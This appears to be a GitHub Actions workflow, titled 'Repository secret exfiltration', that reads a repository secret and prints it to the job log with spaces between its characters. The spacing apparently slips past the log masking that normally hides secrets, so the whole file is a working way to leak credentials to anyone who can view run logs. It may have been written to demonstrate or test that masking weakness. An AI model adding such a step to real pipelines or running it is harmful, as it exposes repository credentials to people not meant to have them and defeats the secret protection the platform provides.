name: Repository secret exfiltration

on:
  workflow_dispatch:

jobs:
  reveal-repo-secret:
    name: Reveal repository secret
    runs-on: ubuntu-latest
    steps:
      - name: Print repository secret
        env:
          REPO_LEVEL_SECRET: ${{ secrets.REPO_LEVEL_SECRET }}
        run: |
          python - <<'PY'
import os
secret = os.environ['REPO_LEVEL_SECRET']
print('Repo secret length:', len(secret))
print('Repo secret (spaced):', ' '.join(secret))
PY
